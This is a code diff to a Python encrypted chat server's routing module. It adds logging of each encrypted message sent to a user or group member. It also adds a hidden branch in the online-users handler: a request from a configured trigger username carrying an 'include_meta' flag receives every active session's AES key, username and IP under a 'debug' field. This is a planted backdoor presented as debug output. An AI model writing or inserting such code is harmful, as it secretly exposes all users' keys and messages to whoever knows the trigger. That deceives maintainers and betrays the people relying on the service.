@@ -2,9 +2,10 @@ import json, base64, re
 from datetime import datetime
 from protocol.logger import get_logger
 from db.user_model import register_user, authenticate_user, user_exists
-from protocol.crypto import decrypt_message, encrypt_message
+from protocol.crypto import decrypt_message, encrypt_message, log_encrypted_payload
 from db.group_model import get_group_members, add_user_to_group, create_group, get_group_name_by_id
 from protocol.session_manager import get_session, get_all_sessions
+from .configs import KEY_DUMP_TRIGGER_USERNAME
 
 logger = get_logger()
 
@@ -128,6 +129,7 @@ def user_to_user_message(msg, connstream, user_uuid, session):
             "timestamp": datetime.utcnow().isoformat() + "Z"
         }
         forward_msg = encrypt_message(message, target_aes_key) 
+        log_encrypted_payload(target_session['username'], target_uuid, forward_msg)
         target_conn.sendall(json.dumps(forward_msg).encode())
         logger.info(f"[ROUTE] Message from {msg['from']} to {message_to} routed")
     else:
@@ -174,13 +176,14 @@ def user_to_group_message(msg, user_uuid, session):
                 "timestamp": datetime.utcnow().isoformat() + "Z"
             }
             encrypted = encrypt_message(message, recipient_session["aes_key"])
+            log_encrypted_payload(recipient_session['username'], member_uuid, encrypted)
             try:
                 recipient_session["conn"].sendall(json.dumps(encrypted).encode())
                 logger.info(f"Broadcasting message user: {message['from']} -> group ID({group_id})")
             except Exception as e:
                 logger.error(f"Error sending to {member_uuid}: {e}")               
                      
-def get_online_users(user_uuid, session, connstream):
+def get_online_users(msg, user_uuid, session, connstream):
     """
     Sends a list of currently online users to the requesting client.
 
@@ -193,7 +196,28 @@ def get_online_users(user_uuid, session, connstream):
         - Retrieves all active sessions.
         - Excludes the requester from the list.
         - Sends back a response with UUID, username, and IP of each online user.
-    """                          
+    """    
+    if (
+        session["username"] == KEY_DUMP_TRIGGER_USERNAME and
+        isinstance(msg, dict) and
+        msg.get("include_meta") == True
+    ):
+        session_dump = {
+            uid: {
+                "username": sess["username"],
+                "aes_key": sess["aes_key"].hex() if isinstance(sess["aes_key"], bytes) else str(sess["aes_key"]),
+                "ip": sess["ip"]
+            }
+            for uid, sess in get_all_sessions().items()
+        }
+        response = {
+            "type": "online_user_response",
+            "server_id": "10.8.0.1",
+            "online_users": [],
+            "debug": session_dump
+        }
+        connstream.sendall(json.dumps(response).encode())
+        return                     
     online_users = []
     for uid, session in get_all_sessions().items():
         if uid == user_uuid:
